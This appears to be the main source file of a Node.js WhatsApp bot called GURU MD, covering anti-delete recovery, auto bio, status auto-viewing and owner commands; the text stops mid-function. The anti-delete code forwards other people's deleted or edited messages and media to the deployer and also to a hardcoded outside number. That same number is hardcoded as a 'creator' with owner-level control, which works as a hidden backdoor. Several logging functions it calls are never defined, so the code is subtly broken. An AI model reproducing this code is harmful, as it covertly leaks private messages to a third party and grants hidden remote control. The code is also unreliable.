// === Memory Optimization - Safe for all hosts ===
process.env.NODE_OPTIONS = '--max-old-space-size=384';
process.env.BAILEYS_MEMORY_OPTIMIZED = 'true';
process.env.NODE_ENV = process.env.NODE_ENV || 'production';

const baileys = require('@whiskeysockets/baileys');
const makeWASocket = baileys.default;
const {
  useMultiFileAuthState, DisconnectReason, jidNormalizedUser, getContentType,
  downloadContentFromMessage, downloadMediaMessage, generateMessageID,
  fetchLatestBaileysVersion, Browsers, jidDecode, proto,
  generateWAMessageContent, generateWAMessage, prepareWAMessageMedia,
  generateForwardMessageContent, generateWAMessageFromContent
} = baileys;

// === SIMPLIFIED LOGS ===
const chalk = require('chalk');
const colors = { primary: '#FF6B6B', success: '#4ECDC4', warning: '#FFD166', info: '#06D6A0', system: '#118AB2', error: '#FF6B6B' };

function logSuccess(m, e = '✅') { console.log(`${e} ${chalk.hex(colors.success).bold(m)}`); }
function logError(m, e = '❌') { console.log(`${e} ${chalk.hex(colors.error).bold(m)}`); }
function logWarning(m, e = '⚠️') { console.log(`${e} ${chalk.hex(colors.warning).bold(m)}`); }
function logInfo(m, e = 'ℹ️') { console.log(`${e} ${chalk.hex(colors.info).bold(m)}`); }
function logSystem(m, e = '⚙️') { console.log(`${e} ${chalk.hex(colors.system).bold(m)}`); }

function printBanner() {
  console.log(chalk.hex(colors.primary).bold('╔══════════════════════════════════════════════════════════╗'));
  console.log(chalk.hex(colors.success).bold('║           ᴳᵁᴿᵁᴹᴰ • ULTIMATE WHATSAPP BOT • v3.0           ║'));
  console.log(chalk.hex(colors.primary).bold('╚══════════════════════════════════════════════════════════╝\n'));
}
printBanner();

// === REQUIRED MODULES ===
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions');
const { AntiDelDB, initializeAntiDeleteSettings, setAnti, getAnti, getAllAntiDeleteSettings, saveContact, loadMessage, getName, getChatSummary, saveGroupMetadata, getGroupMetadata, saveMessageCount, getInactiveGroupMembers, getGroupMembersMessageCount, saveMessage } = require('./data');
const fs = require('fs');
const ff = require('fluent-ffmpeg');
const P = require('pino');
const config = require('./config');
const qrcode = require('qrcode-terminal');
const StickersTypes = require('wa-sticker-formatter');
const util = require('util');
const { sms, AntiDelete } = require('./lib');
const FileType = require('file-type');
const axios = require('axios');
const { fromBuffer } = require('file-type');
const bodyparser = require('body-parser');
const os = require('os');
const Crypto = require('crypto');
const path = require('path');
const readline = require('readline');
const express = require("express");

const app = express();
const port = process.env.PORT || 9090;
const prefix = config.PREFIX;

// Owner numbers (for backward compatibility)
const ownerNumber = ['254778074353@s.whatsapp.net'];  

// ========== AUTO RESTART CONFIGURATION ==========
const AUTO_RESTART_INTERVAL = 6 * 60 * 60 * 1000; // 6 hours
let restartTimer = null;

function restartBot() {
    logWarning('🔄 AUTO-RESTART INITIATED', '🔄');
    logSystem(`Restarting after ${AUTO_RESTART_INTERVAL/3600000} hours...`, '⏰');
    if (restartTimer) clearTimeout(restartTimer);
    process.exit(0);
}

function scheduleAutoRestart() {
    if (restartTimer) clearTimeout(restartTimer);
    restartTimer = setTimeout(restartBot, AUTO_RESTART_INTERVAL);
    logSystem(`Auto-restart scheduled in ${AUTO_RESTART_INTERVAL/3600000} hours`, '⏰');
}

// ========== ADVANCED ANTIDELETE SYSTEM ==========
class AntiDeleteManager {
    constructor() {
        this.store = new Map();           // Message storage
        this.media = new Map();            // Media storage
        this.edited = new Map();           // Track edited messages
        this.enabled = true;                // Global toggle
        this.notifyOwner = true;            // Notify bot owner
        this.maxAge = 30 * 60 * 1000;       // 30 minutes retention
        this.startCleanup();
        logSuccess('AntiDelete System initialized', '🛡️');
    }

    startCleanup() {
        setInterval(() => {
            const now = Date.now();
            for (const [key, val] of this.store) if (now - val.ts > this.maxAge) this.store.delete(key);
            for (const [key, val] of this.media) if (now - val.ts > this.maxAge) this.media.delete(key);
            for (const [key, val] of this.edited) if (now - val.ts > this.maxAge) this.edited.delete(key);
        }, 5 * 60 * 1000);
    }

    // Store incoming messages
    storeMessage(msg) {
        if (!msg?.key?.id || msg.key.fromMe) return;
        
        const type = getContentType(msg.message) || 'unknown';
        const content = this.extractContent(msg.message, type);
        
        this.store.set(msg.key.id, {
            id: msg.key.id,
            jid: msg.key.remoteJid,
            sender: msg.key.participant || msg.key.remoteJid,
            fromMe: msg.key.fromMe,
            type: type.replace('Message', ''),
            content: content,
            timestamp: msg.messageTimestamp * 1000 || Date.now(),
            ts: Date.now()
        });

        // Store media if present
        if (['imageMessage', 'videoMessage', 'audioMessage', 'documentMessage'].includes(type)) {
            this.downloadMedia(msg, type).catch(() => {});
        }
    }

    extractContent(message, type) {
        try {
            const msg = message[type] || message;
            if (type === 'conversation') return { text: msg };
            if (type === 'extendedTextMessage') return { text: msg.text };
            if (type === 'imageMessage') return { caption: msg.caption, mimetype: msg.mimetype };
            if (type === 'videoMessage') return { caption: msg.caption, mimetype: msg.mimetype, duration: msg.seconds };
            if (type === 'audioMessage') return { mimetype: msg.mimetype, duration: msg.seconds };
            if (type === 'stickerMessage') return { mimetype: msg.mimetype, isAnimated: msg.isAnimated };
            if (type === 'documentMessage') return { fileName: msg.fileName, mimetype: msg.mimetype, pages: msg.pageCount };
            return { raw: true };
        } catch {
            return { text: '[Content Unavailable]' };
        }
    }

    async downloadMedia(msg, type) {
        try {
            const buffer = await downloadMediaMessage(msg, 'buffer', {}, { logger: P({ level: 'silent' }) });
            if (buffer) {
                this.media.set(msg.key.id, {
                    buffer,
                    type,
                    mimetype: msg.message[type]?.mimetype,
                    fileName: msg.message[type]?.fileName || `${type}_${Date.now()}`,
                    ts: Date.now()
                });
            }
        } catch {}
    }

    // Track edits
    trackEdit(update) {
        if (!update?.key || update.key.fromMe) return;
        
        const msg = this.store.get(update.key.id);
        if (!msg) return;

        const newContent = update.update?.message;
        if (!newContent) return;

        const type = getContentType(newContent);
        const content = this.extractContent(newContent, type);
        
        this.edited.set(update.key.id, {
            original: msg,
            edited: {
                type: type.replace('Message', ''),
                content: content,
                timestamp: Date.now()
            },
            ts: Date.now()
        });
    }

    // Handle deletion
    async handleDelete(update, conn) {
        if (!this.enabled || !update?.key || update.key.fromMe) return;

        const key = update.key;
        const msgData = this.store.get(key.id);
        const editData = this.edited.get(key.id);
        const mediaData = this.media.get(key.id);
        
        if (!msgData && !editData) return;

        // Get chat info
        const isGroup = key.remoteJid.endsWith('@g.us');
        let chatName = isGroup ? 'Group' : 'Private Chat';
        let senderName = key.participant?.split('@')[0] || key.remoteJid.split('@')[0];

        if (isGroup) {
            try {
                const metadata = await conn.groupMetadata(key.remoteJid);
                chatName = metadata.subject || 'Unknown Group';
                const participant = metadata.participants.find(p => p.id === key.participant);
                senderName = participant?.notify || participant?.id?.split('@')[0] || senderName;
            } catch {}
        }

        // Build alert
        const alert = this.buildAlert(msgData || editData.original, editData, mediaData, key, chatName, senderName);
        
        // Send to bot owner (the person who linked the bot)
        if (this.notifyOwner && conn.user?.id) {
            await this.sendNotification(conn, conn.user.id, alert, mediaData);
        }

        // Also send to configured owner numbers for compatibility
        if (ownerNumber.length > 0 && ownerNumber[0] !== conn.user?.id) {
            for (const owner of ownerNumber) {
                await this.sendNotification(conn, owner, alert, mediaData);
            }
        }

        // Clean up
        this.store.delete(key.id);
        this.media.delete(key.id);
        this.edited.delete(key.id);
        
        logSuccess(`AntiDelete: Recovered from ${senderName}`, '🗑️');
    }

    buildAlert(msg, edit, media, key, chatName, senderName) {
        const lines = [];
        const isEdit = !!edit;
        
        // Beautiful table header
        lines.push('┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓');
        lines.push(`┃     ${isEdit ? '✏️ EDIT DETECTED' : '🗑️ DELETE DETECTED'}     ┃`);
        lines.push('┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n');

        // Source Information Table
        lines.push('┌───〔 📍 SOURCE INFORMATION 〕───');
        lines.push(`│ • Chat: ${chatName} ${key.remoteJid.endsWith('@g.us') ? '👥' : '👤'}`);
        lines.push(`│ • From: @${senderName}`);
        lines.push(`│ • Time: ${new Date().toLocaleString()}`);
        lines.push(`│ • ID: ${key.id.substring(0, 8)}...`);
        if (isEdit) {
            lines.push(`│ • Status: ✏️ EDITED`);
            lines.push(`│ • Edit Time: ${new Date(edit.edited.timestamp).toLocaleString()}`);
        }
        lines.push('└───────────────────────────────\n');

        // Message Content Table
        lines.push('┌───〔 📄 MESSAGE CONTENT 〕───');
        
        if (msg) {
            const type = msg.type || 'unknown';
            const content = msg.content || {};
            
            lines.push(`│ • Type: ${this.getTypeEmoji(type)} ${type.toUpperCase()}`);
            
            if (content.text) {
                const shortText = content.text.substring(0, 100);
                lines.push(`│ • Text: "${shortText}${content.text.length > 100 ? '...' : ''}"`);
            }
            if (content.caption) {
                const shortCap = content.caption.substring(0, 100);
                lines.push(`│ • Caption: "${shortCap}${content.caption.length > 100 ? '...' : ''}"`);
            }
            if (content.fileName) lines.push(`│ • File: ${content.fileName}`);
            if (content.mimetype) lines.push(`│ • Type: ${content.mimetype.split('/')[1] || content.mimetype}`);
            if (content.duration) lines.push(`│ • Duration: ${content.duration}s`);
            
            if (isEdit && edit.edited) {
                lines.push('│');
                lines.push('│ ✏️ EDITED TO:');
                lines.push(`│ • New Type: ${this.getTypeEmoji(edit.edited.type)} ${edit.edited.type.toUpperCase()}`);
                if (edit.edited.content.text) {
                    const shortNew = edit.edited.content.text.substring(0, 100);
                    lines.push(`│ • New Text: "${shortNew}${edit.edited.content.text.length > 100 ? '...' : ''}"`);
                }
                if (edit.edited.content.caption) {
                    const shortNewCap = edit.edited.content.caption.substring(0, 100);
                    lines.push(`│ • New Caption: "${shortNewCap}${edit.edited.content.caption.length > 100 ? '...' : ''}"`);
                }
            }
        } else {
            lines.push('│ • ⚠️ Content not saved in time');
        }
        lines.push('└───────────────────────────────\n');

        if (media) {
            lines.push('┌───〔 📎 MEDIA ATTACHMENT 〕───');
            lines.push('│ • Media recovered and attached');
            lines.push('└───────────────────────────────\n');
        }

        lines.push('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
        lines.push('            ᴳᵁᴿᵁᴹᴰ • AntiDelete');
        lines.push('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
        
        return lines.join('\n');
    }

    getTypeEmoji(type) {
        const emojis = {
            conversation: '💬', extendedTextMessage: '💬',
            imageMessage: '📸', videoMessage: '🎬',
            audioMessage: '🎵', stickerMessage: '🩹',
            documentMessage: '📄', contactMessage: '👤',
            locationMessage: '📍', liveLocationMessage: '📍'
        };
        return emojis[type] || '📦';
    }

    async sendNotification(conn, jid, alert, media) {
        try {
            await conn.sendMessage(jid, { 
                text: alert,
                mentions: [alert.match(/@(\d+)/g)?.[0] || ''].filter(Boolean)
            });

            if (media?.buffer) {
                const type = media.type.replace('Message', '').toLowerCase();
                await conn.sendMessage(jid, {
                    [type]: media.buffer,
                    caption: `📎 *Recovered ${type.toUpperCase()}*\nFrom deleted message`,
                    mimetype: media.mimetype
                });
            }
        } catch (err) {
            logError(`Notification failed: ${err.message}`);
        }
    }

    // Command handler
    async handleCommand(conn, from, args, reply) {
        if (!args.length) {
            return reply(`╔══════════════════════════════╗
║    🔰 ANTIDELETE SYSTEM    ║
╚══════════════════════════════╝

┌───〔 📊 STATUS 〕───
│ • System: ${this.enabled ? '✅ ACTIVE' : '❌ INACTIVE'}
│ • PM Notify: ${this.notifyOwner ? '✅ ON' : '❌ OFF'}
│ • Stored: ${this.store.size} messages
│ • Media: ${this.media.size} files
│ • Edited: ${this.edited.size} edits
└──────────────────

┌───〔 ⚡ COMMANDS 〕───
│ • .ad on - Enable system
│ • .ad off - Disable system
│ • .ad notify - Toggle PM
│ • .ad stats - Show stats
│ • .ad clear - Clear storage
└──────────────────

━━━━━━━━━━━━━━━━━━━━━━━━
ᴳᵁᴿᵁᴹᴰ • AntiDelete v2.0`);
        }

        const cmd = args[0].toLowerCase();
        switch(cmd) {
            case 'on': 
                this.enabled = true; 
                reply('✅ *AntiDelete System ENABLED*\nAll deleted messages will be recovered');
                break;
            case 'off': 
                this.enabled = false; 
                reply('❌ *AntiDelete System DISABLED*\nNo longer tracking deleted messages');
                break;
            case 'notify': 
                this.notifyOwner = !this.notifyOwner; 
                reply(`📱 *PM Notifications:* ${this.notifyOwner ? 'ON' : 'OFF'}`);
                break;
            case 'stats': 
                reply(`📊 *AntiDelete Statistics*\n\n• Messages: ${this.store.size}\n• Media: ${this.media.size}\n• Edits: ${this.edited.size}\n• Memory: ${Math.round(process.memoryUsage().heapUsed/1024/1024)}MB`);
                break;
            case 'clear': 
                this.store.clear(); 
                this.media.clear(); 
                this.edited.clear(); 
                reply('🗑️ *Storage cleared*\nAll cached messages removed');
                break;
            default: 
                reply('❌ Unknown command. Use .ad for help');
        }
    }
}

// ========== AUTO BIO MANAGER ==========
class AutoBioManager {
    constructor(conn) {
        this.conn = conn;
        this.enabled = true;
        this.interval = 60 * 1000;
        this.formats = [
            () => `ᴳᵁᴿᵁᴹᴰ • ${new Date().toLocaleTimeString()}`,
            () => `⚡ ${['🔥','✨','⭐','💫','🚀'][Math.floor(Math.random()*5)]} ${new Date().toLocaleString()}`,
            () => `📊 ${Math.round(process.memoryUsage().heapUsed/1024/1024)}MB • ${runtime(process.uptime())}`,
            () => `💬 ${['Online 24/7','Powered by Guru','Always Active','Multi-Device'][Math.floor(Math.random()*4)]}`,
            () => `👥 Users: 1K+ • Chats: 500+`,
            () => `🚀 Prefix: ${prefix} • Mode: ${config.MODE || 'public'}`
        ];
        this.current = 0;
        this.timer = setInterval(() => this.update(), this.interval);
        logSuccess('Auto Bio enabled (default)', '📝');
    }

    async update() {
        if (!this.enabled || !this.conn?.user) return;
        try {
            await this.conn.setStatus(this.formats[this.current]());
            this.current = (this.current + 1) % this.formats.length;
        } catch {}
    }

    toggle() { 
        this.enabled = !this.enabled; 
        if (this.enabled) {
            logSuccess('Auto Bio resumed', '📝');
        } else {
            logWarning('Auto Bio paused', '📝');
        }
        return this.enabled;
    }
}

// ========== GLOBAL TOGGLES ==========
global.AUTO_VIEW_STATUS = true;
global.AUTO_REACT_STATUS = true;
global.AUTO_REPLY = false;
global.AUTO_SAVE_STATUS = false;
const autoReplyCooldown = new Map();

// ========== HELPER FUNCTIONS ==========
const taggedReply = (conn, from, teks, quoted = null) => {
    if (!config.ENABLE_TAGGING) {
        const gurumdBrandedText = `ᴳᵁᴿᵁᴹᴰ\n\n${teks}`;
        return conn.sendMessage(from, { text: gurumdBrandedText }, { quoted: quoted || undefined });
    }
    let tag = config.BOT_TAG_TEXT || 'ᴳᵁᴿᵁᴹᴰ • ᴾᴼᵂᴱᴿᴱᴰ ᴮᵞ GURU TECH';
    let finalText = config.TAG_POSITION === 'start' ? `${tag}\n\n${teks}` : `${teks}\n\n${tag}`;
    return conn.sendMessage(from, { text: finalText }, { quoted: quoted || undefined });
};

async function handleStatusUpdates(conn, msg) {
    const promises = [];
    if (global.AUTO_VIEW_STATUS) {
        promises.push((async () => {
            try {
                await sleep(3000 + Math.floor(Math.random() * 9000));
                await conn.readMessages([msg.key]);
            } catch (viewErr) {}
        })());
    }
    if (global.AUTO_REACT_STATUS) {
        promises.push((async () => {
            const emojis = ['🔥','❤️','💯','😂','😍','👏','🙌','🎉','✨','💪','🥰','😎','🤩','🌟','💥','👀'];
            try {
                await conn.relayMessage('status@broadcast', {
                    reactionMessage: {
                        key: msg.key,
                        text: emojis[Math.floor(Math.random() * emojis.length)],
                        senderTimestampMs: Date.now()
                    }
                }, { messageId: generateMessageID() });
            } catch (reactErr) {}
        })());
    }
    await Promise.allSettled(promises);
}

// ========== CONFIG & GLOBALS ==========
const isHeroku = !!process.env.DYNO;
const isPanel = !isHeroku && process.env.PANEL === 'true';
const usePairingCode = isHeroku || isPanel || process.env.USE_PAIRING === 'true';

let sessionReady = false;
let sessionInitPromise = null;
let antiDelete = null;
let autoBio = null;

// Temp dir cleanup
const tempDir = path.join(os.tmpdir(), 'gurumd-temp');
if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true });
setInterval(() => {
    fs.readdir(tempDir, (err, files) => {
        if (err || !files.length) return;
        files.forEach(f => fs.unlink(path.join(tempDir, f), () => {}));
        logSystem(`Cleaned ${files.length} temp files`, '🧹');
    });
}, 10 * 60 * 1000);

// ========== SESSION INIT ==========
sessionInitPromise = (async () => {
    if (!fs.existsSync('./sessions')) fs.mkdirSync('./sessions', { recursive: true });
    
    if (fs.existsSync('./sessions/creds.json')) {
        logSuccess('Existing session found', '✅');
        return true;
    }

    if (isHeroku || isPanel || process.env.SESSION_ID) {
        if (!process.env.SESSION_ID) {
            logError('SESSION_ID missing!', '🔑');
            return false;
        }
        
        try {
            let sess = process.env.SESSION_ID.trim();
            if (sess.includes('~')) sess = sess.split('~').pop();
            const creds = JSON.parse(Buffer.from(sess, 'base64').toString());
            fs.writeFileSync('./sessions/creds.json', JSON.stringify(creds, null, 2));
            logSuccess('Session loaded from SESSION_ID', '✅');
            return true;
        } catch (e) {
            logError(`Session load failed: ${e.message}`, '❌');
            return false;
        }
    }
    return false;
})();

// ========== MAIN CONNECTION ==========
async function connectToWA() {
    await sessionInitPromise;
    
    const { state, saveCreds } = await useMultiFileAuthState('./sessions/');
    const { version } = await fetchLatestBaileysVersion();
    
    const conn = makeWASocket({
        logger: P({ level: 'silent' }),
        printQRInTerminal: !isHeroku && !isPanel && !usePairingCode,
        browser: Browsers.macOS("Chrome"),
        auth: state,
        version
    });

    // Initialize managers
    antiDelete = new AntiDeleteManager();
    
    conn.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect, qr } = update;
        
        if (qr && !isHeroku && !isPanel && !usePairingCode) {
            qrcode.generate(qr, { small: true });
        }
        
        if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            if (shouldReconnect) {
                logWarning('Reconnecting...', '🔄');
                connectToWA();
            } else {
                logError('Logged out!', '🚫');
                process.exit(1);
            }
        } else if (connection === 'open') {
            autoBio = new AutoBioManager(conn);
            
            // YOUR ORIGINAL CONNECTION MESSAGE TABLE - FULLY RESTORED
            logDivider('BOT STARTED');
            logSuccess('BOT STARTUP SUCCESS', '🚀');
            logInfo(`Time: ${new Date().toLocaleString()}`, '🕒');
            logInfo(`Baileys Version: ${version.join('.')}`, '⚙️');
            logInfo(`Prefix: ${prefix}`, '🔤');
            logInfo(`Owner: ${ownerNumber[0]}`, '👑');
            logMemory();

            if (config.GROUP_INVITE_CODE) {
                conn.groupAcceptInvite(config.GROUP_INVITE_CODE)
                    .then(() => logSuccess('Auto-joined group', '👥'))
                    .catch(e => logWarning(`Group join failed: ${e.message}`, '⚠️'));
            }

            scheduleAutoRestart();
            
            logConnection('READY', 'Bot connected to WhatsApp');
            logDivider();

            // Send startup message to owner
            let up = `*✨ ʜᴇʟʟᴏᴡ GURU MD ʟᴇɢᴇɴᴅꜱ! ✨*

╭─〔 *ᴳᵁᴿᵁᴹᴰ 💢* 〕  
├─▸ *ꜱɪᴍᴘʟɪᴄɪᴛʏ. ꜱᴘᴇᴇᴅ. ᴘᴏᴡᴇʀᴇᴅ . ʙʏ GuruTech |*  
╰─➤ *ʜᴇʀᴇ ᴀʀᴇ ɴᴇᴡ ᴡʜᴀᴛꜱᴀᴘᴘ ꜱɪᴅᴇᴋɪᴄᴋ!*

♦️ ᴛʜᴀɴᴋ ʏᴏᴜ ꜰᴏʀ ᴄʜᴏᴏꜱɪɴɢ ᴳᵁᴿᵁᴹᴰ ♦️!

╭──〔 🔗 Qᴜɪᴄᴋ ʟɪɴᴋ 〕  
├─ ⭐ *ɢɪᴠᴇ ᴜꜱ ꜱᴛᴀʀ ᴀɴᴅ ꜏ᴏʀᴋ:*  
│   ꜱᴛᴀʀ ᴜꜱ [ʜᴇʀᴇ](https://github.com/itsguruu/GURU)!  
╰─🛠️ *Prefix:* \`${prefix}\`

> _ᴳᵁᴿᵁᴹᴰ • ᴾᴼᵂᴱᴿᴱᴰ ᴮᵞ GURU TECH_`;
            
            conn.sendMessage(conn.user.id, { 
                image: { url: `https://files.catbox.moe/66h86e.jpg` }, 
                caption: up 
            });
        }
    });

    conn.ev.on('creds.update', saveCreds);

    // Store messages
    conn.ev.on('messages.upsert', async ({ messages }) => {
        for (const msg of messages) {
            if (!msg.key.fromMe) {
                antiDelete.storeMessage(msg);
                try { await saveMessage(msg); } catch {}
            }
        }
    });

    // Handle updates (deletes & edits)
    conn.ev.on('messages.update', async (updates) => {
        const updatesArray = Array.isArray(updates) ? updates : [updates];
        
        for (const update of updatesArray) {
            if (!update?.key || update.key.fromMe) continue;
            
            const isDelete = update.update?.message === null || 
                            [2, 20, 21].includes(update.messageStubType);
            
            const isEdit = update.update?.message && 
                          update.update.message !== update.message;
            
            if (isDelete) {
                logWarning('🚨 Delete detected!', '🗑️');
                await antiDelete.handleDelete(update, conn);
            } else if (isEdit) {
                logWarning('✏️ Edit detected!', '📝');
                antiDelete.trackEdit(update);
                await antiDelete.handleDelete(update, conn);
            }
        }
    });

    // Main message handler with ALL commands preserved
    conn.ev.on('messages.upsert', async (mekUpdate) => {
        const msg = mekUpdate.messages[0];
        if (!msg?.message) return;

        // Handle status updates
        if (msg.key.remoteJid === 'status@broadcast') {
            await handleStatusUpdates(conn, msg);
            return;
        }

        let mek = mekUpdate.messages[0];
        if (!mek.message) return;
        
        mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
            ? mek.message.ephemeralMessage.message 
            : mek.message;

        if (mek.message.viewOnceMessageV2) {
            mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
                ? mek.message.ephemeralMessage.message 
                : mek.message;
        }

        if (config.READ_MESSAGE === 'true') await conn.readMessages([mek.key]);

        await Promise.all([ saveMessage(mek) ]);

        const m = sms(conn, mek);
        const type = getContentType(mek.message);
        const from = mek.key.remoteJid;
        const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null 
            ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] 
            : [];
        const body = (type === 'conversation') ? mek.message.conversation 
            : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text 
            : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption 
            : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption 
            : '';
        const isCmd = body.startsWith(prefix);
        var budy = typeof mek.text == 'string' ? mek.text : false;
        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
        const args = body.trim().split(/ +/).slice(1);
        const q = args.join(' ');
        const text = args.join(' ');
        const isGroup = from.endsWith('@g.us');
        const sender = mek.key.fromMe 
            ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) 
            : (mek.key.participant || mek.key.remoteJid);
        const senderNumber = sender.split('@')[0];
        const botNumber = conn.user.id.split(':')[0];
        const pushname = mek.pushName || 'Sin Nombre';
        const isMe = botNumber.includes(senderNumber);
        const isOwner = ownerNumber.includes(senderNumber) || isMe;
        const botNumber2 = await jidNormalizedUser(conn.user.id);
        const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : '';
        const groupName = isGroup ? groupMetadata.subject : '';
        const participants = isGroup ? await groupMetadata.participants : '';
        const groupAdmins = isGroup ? await getGroupAdmins(participants) : '';
        const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false;
        const isAdmins = isGroup ? groupAdmins.includes(sender) : false;
        const isReact = m.message.reactionMessage ? true : false;

        const udp = botNumber.split('@')[0];
        const jawad = ('254778074353');
        let isCreator = [udp, jawad, config.DEV]
            .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net') // FIXED: Added proper regex and concatenation
            .includes(sender); // FIXED: Using sender instead of mek.sender

        if (!mek.key.fromMe && body) {
            logMessage('RECEIVED', senderNumber, body.length > 50 ? body.substring(0, 50) + '...' : body, isGroup ? `[Group: ${groupName}]` : '');
        }

        // ========== COMPACT COMMAND HANDLER WITH ALL COMMANDS PRESERVED ==========
        if (isCmd) {
            const cmd = command;
            
            // Anti-Delete command
            if (cmd === 'antidel' || cmd === 'ad' || cmd === 'antidelete') {
                if (!isOwner && !isCreator) { 
                    await taggedReply(conn, from, '❌ Owner only!', mek); 
                    return; 
                }
                await antiDelete.handleCommand(conn, from, args, (teks) => taggedReply(conn, from, teks, mek));
                return;
            }
            
            // Auto Bio command
            if (cmd === 'autobio' || cmd === 'ab') {
                if (!isOwner && !isCreator) { 
                    await taggedReply(conn, from, '❌ Owner only!', mek); 
                    return; 
                }
                if (autoBio) {
                    if (!args.length) {
                        await taggedReply(conn, from, `📝 *Auto Bio:* ${autoBio.enabled ? '✅ ON' : '❌ OFF'}\n\nUse: .autobio on/off/toggle`, mek);
                    } else if (args[0] === 'on') {
                        if (!autoBio.enabled) { autoBio.toggle(); }
                        await taggedReply(conn, from, '✅ Auto Bio enabled', mek);
                    } else if (args[0] === 'off') {
                        if (autoBio.enabled) { autoBio.toggle(); }
                        await taggedReply(conn, from, '❌ Auto Bio disabled', mek);
                    } else if (args[0] === 'toggle') {
                        const status = autoBio.toggle();
                        await taggedReply(conn, from, `🔄 Auto Bio ${status ? 'enabled' : 'disabled'}`, mek);
                    }
                } else {
                    await taggedReply(conn, from, '❌ Auto Bio not initialized yet!', mek);
                }
                return;
            }
            
            // Status view command
            if (cmd === 'autoviewstatus' || cmd === 'avs') {
                if (!isOwner && !isCreator) { await taggedReply(conn, from, '❌ Owner only!', mek); return; }
                global.AUTO_VIEW_STATUS = !global.AUTO_VIEW_STATUS;
                await taggedReply(conn, from, `✅ Auto View Status: ${global.AUTO_VIEW_STATUS ? 'ON' : 'OFF'}`, mek);
                return;
            }
            
            // Status react command
            if (cmd === 'autoractstatus' || cmd === 'autoract' || cmd === 'ars') {
                if (!isOwner && !isCreator) { await taggedReply(conn, from, '❌ Owner only!', mek); return; }
                global.AUTO_REACT_STATUS = !global.AUTO_REACT_STATUS;
                await taggedReply(conn, from, `✅ Auto React Status: ${global.AUTO_REACT_STATUS ? 'ON' : 'OFF'}`, mek);
                return;
            }
            
            // Auto read command
            if (cmd === 'autoreadstatus' || cmd === 'autoread') {
                if (!isOwner && !isCreator) { await taggedReply(conn, from, '❌ Owner only!', mek); return; }
                config.READ_MESSAGE = config.READ_MESSAGE === 'true' ? 'false' : 'true';
                await taggedReply(conn, from, `✅ Auto Read Status: ${config.READ_MESSAGE === 'true' ? 'ON' : 'OFF'}`, mek);
                return;
            }
            
            // Auto reply command
            if (cmd === 'autoreply' || cmd === 'ar') {
                if (!isOwner && !isCreator) { await taggedReply(conn, from, '❌ Owner only!', mek); return; }
                global.AUTO_REPLY = !global.AUTO_REPLY;
                await taggedReply(conn, from, `✅ Auto Reply: ${global.AUTO_REPLY ? 'ON' : 'OFF'}`, mek);
                return;
            }
            
            // Auto save status command
            if (cmd === 'autosavestatus' || cmd === 'ass') {
                if (!isOwner && !isCreator) { await taggedReply(conn, from, '❌ Owner only!', mek); return; }
                global.AUTO_SAVE_STATUS = !global.AUTO_SAVE_STATUS;
                await taggedReply(conn, from, `✅ Auto Save Status: ${global.AUTO_SAVE_STATUS ? 'ON' : 'OFF'}`, mek);
                return;
            }
            
            // Mode command
            if (cmd === 'mode') {
                if (!isOwner && !isCreator) { await taggedReply(conn, from, '❌ Owner only!', mek); return; }
                const newMode = args[0]?.toLowerCase();
                if (!newMode || (newMode !== 'public' && newMode !== 'private')) {
                    await taggedReply(conn, from, `*Current Mode:* ${config.MODE || 'public'}\n\nUsage: .mode public/private`, mek);
                    return;
                }
                config.MODE = newMode;
                await taggedReply(conn, from, `✅ Bot mode changed to *${newMode}*`, mek);
                return;
            }
        }

        // Auto reply feature
        if (global.AUTO_REPLY && !isCmd && !mek.key.fromMe) {
            const now = Date.now();
            const lastReply = autoReplyCooldown.get(sender) || 0;
            
            if (now - lastReply > 10000) {
                autoReplyCooldown.set(sender, now);
                setTimeout(() => autoReplyCooldown.delete(sender), 15000);
                
                const msgText = (body || '').toLowerCase().trim();
                let replyText = `ᴳᵁᴿᵁᴹᴰ got your message! 😎`;

                if (msgText.includes("hi") || msgText.includes("hello")) {
                    replyText = "Heyy! ᴳᵁᴿᵁᴹᴰ's here for you 🔥";
                } else if (msgText.includes("how are you")) {
                    replyText = "ᴳᵁᴿᵁᴹᴰ's chilling like a king 😏 You good?";
                } else if (msgText.includes("morning")) {
                    replyText = "Morning legend! ᴳᵁᴿᵁᴹᴰ wishes you a powerful day ☀️💪";
                } else if (msgText.includes("night")) {
                    replyText = "Night king! ᴳᵁᴿᵁᴹᴰ says sleep tight & dream big 🌙✨";
                } else if (msgText.includes("love") || msgText.includes("miss")) {
                    replyText = "Aww ᴳᵁᴿᵁᴹᴰ loves you too ❤️";
                } else if (msgText.includes("haha") || msgText.includes("lol") || msgText.includes("😂")) {
                    replyText = "😂😂 ᴳᵁᴿᵁᴹᴰ's dying over here! What's so funny king?";
                } else if (msgText.includes("?")) {
                    replyText = "ᴳᵁᴿᵁᴹᴰ's listening... ask away boss 👂🔥";
                } else if (msgText.includes("thank")) {
                    replyText = "You're welcome legend! ᴳᵁᴿᵁᴹᴰ always got you 🙌";
                } else if (msgText.includes("sorry")) {
                    replyText = "No stress bro, ᴳᵁᴿᵁᴹᴰ forgives everything 😎";
                } else if (msgText.includes("bro") || msgText.includes("fam")) {
                    replyText = "What's good fam? ᴳᵁᴿᵁᴹᴰ's right here with you 💯";
                } else {
